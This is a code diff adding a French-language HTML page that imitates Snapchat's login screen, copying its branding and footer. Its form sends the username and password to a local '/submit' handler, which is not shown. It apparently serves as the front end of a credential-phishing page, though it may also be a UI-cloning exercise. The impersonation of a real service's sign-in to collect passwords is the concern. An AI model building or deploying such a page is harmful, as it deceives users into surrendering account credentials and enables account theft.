@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Snapchat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="form">
+        <form class="login-container" method="post" action="/submit">
+            <div class="snapchat-logo">
+                <img src="ghost.svg" alt="" srcset="">
+            </div>
+            <h1>Se connecter a Snapchat</h1>
+            <div class="form-group">
+                <label for="">Nom d'utilisateur ou adresse mail</label>
+                <div class="form-input">
+                    <input type="text" name="username">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="">Mot de passe</label>
+                <div class="form-input">
+                    <input type="password" name="password">
+                </div>
+                
+            </div>
+            <div class="btn">
+                <button type="submit" class="next-button">Connexion</button>
+            </div>
+        </form>
+    </div>
+
+    
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <div class="section-header">
+                    <h3>Entreprise</h3>
+                    <svg class="accordion-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <path d="M6 9l6 6 6-6" />
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <a href="#">Snap Inc.</a>
+                    <a href="#">Carrières</a>
+                    <a href="#">Actualités</a>
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="section-header">
+                    <h3>Communauté</h3>
+                    <svg class="accordion-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <path d="M6 9l6 6 6-6" />
+                    </svg>
+                </div>
+                <div class="section-content">
+
+                    <a href="#">Assistance</a>
+                    <a href="#">Règles de la communauté</a>
+                    <a href="#">Centre de sécurité</a>
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="section-header">
+                    <h3>Publicité</h3>
+                    <svg class="accordion-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <path d="M6 9l6 6 6-6" />
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <a href="#">Acheter des publicités</a>
+                    <a href="#">Politiques publicitaires</a>
+                    <a href="#">Bibliothèque des publicités politiques</a>
+                    <a href="#">Directives de la marque</a>
+                    <a href="#">Règles des promotions</a>
+                </div>
+            </div>
+            <div class="footer-section">
+                <div class="section-header">
+                    <h3>Légal</h3>
+                    <svg class="accordion-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <path d="M6 9l6 6 6-6" />
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <a href="#">Centre de confidentialité</a>
+                    <a href="#">Vos choix de confidentialité</a>
+                    <a href="#">Politique relative aux cookies</a>
+                    <a href="#">Signaler une infraction</a>
+                    <a href="#">Conditions des outils créatifs personnalisés</a>
+                    <a href="#">Conditions des filtres communautaires</a>
+                    <a href="#">Conditions de Lens Studio</a>
+                </div>
+            </div>
+        </div>
+        <div class="language-section">
+            <select class="language-select">
+                <option>Français (FR)</option>
+            </select>
+        </div>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            const sectionHeaders = document.querySelectorAll('.section-header');
+
+            sectionHeaders.forEach(header => {
+                header.addEventListener('click', function() {
+                    
+                    const section = this.closest('.footer-section');
+                    const content = section.querySelector('.section-content');
+                    const icon = section.querySelector('.accordion-icon');
+
+                    
+                    if (window.innerWidth <= 768) {
+                        
+                        content.classList.toggle('active');
+                        icon.classList.toggle('active');
+
+                        
+                        const otherSections = document.querySelectorAll('.footer-section');
+                        otherSections.forEach(otherSection => {
+                            if (otherSection !== section) {
+                                const otherContent = otherSection.querySelector('.section-content');
+                                const otherIcon = otherSection.querySelector('.accordion-icon');
+                                otherContent.classList.remove('active');
+                                otherIcon.classList.remove('active');
+                            }
+                        });
+                    }
+                });
+            });
+
+            
+            window.addEventListener('resize', function() {
+                if (window.innerWidth > 768) {
+                    
+                    document.querySelectorAll('.section-content, .accordion-icon').forEach(el => {
+                        el.classList.remove('active');
+                    });
+                }
+            });
+        });
+    </script>
+
+    <div class="bottom-footer">
+        <a href="#">Politique de confidentialité</a>
+        <a href="#">Conditions d'utilisation</a>
+    </div>
+</body>
+
+</html>
